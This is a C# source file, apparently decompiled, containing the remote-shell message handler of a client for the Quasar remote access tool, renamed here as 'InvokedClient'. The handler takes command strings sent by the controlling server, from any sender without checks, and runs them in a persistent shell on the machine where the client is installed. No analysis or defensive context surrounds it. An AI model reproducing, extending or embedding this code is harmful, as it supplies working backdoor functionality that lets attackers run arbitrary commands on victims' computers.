

using System;
using InvokedClient.IO;
using InvokedClient.Networking;
using InvokedCommon.Messages;
using InvokedCommon.Networking;


namespace InvokedClient.MessageHandlers
{
	public class RemoteShellHandler : IMessageProcessor, IDisposable
	{
		private Shell _shell;
		private readonly QuasarClient _client;

		public RemoteShellHandler(QuasarClient client)
		{
			this._client = client;
			this._client.ClientState += new Client.ClientStateEventHandler(this.OnClientStateChange);
		}

		private void OnClientStateChange(Client s, bool connected)
		{
			if (connected)
				return;
			this._shell?.Dispose();
		}

		public bool CanExecute(IMessage message) => message is DoShellExecute;

		public bool CanExecuteFrom(ISender sender) => true;

		public void Execute(ISender sender, IMessage message)
		{
			if (!(message is DoShellExecute message1))
				return;
			this.Execute(sender, message1);
		}

		private void Execute(ISender client, DoShellExecute message)
		{
			string command = message.Command;
			if (this._shell == null && command == "exit")
				return;
			if (this._shell == null)
				this._shell = new Shell(this._client);
			if (command == "exit")
				this._shell.Dispose();
			else
				this._shell.ExecuteCommand(command);
		}

		public void Dispose()
		{
			this.Dispose(true);
			GC.SuppressFinalize((object)this);
		}

		protected virtual void Dispose(bool disposing)
		{
			if (!disposing)
				return;
			this._shell?.Dispose();
		}
	}
}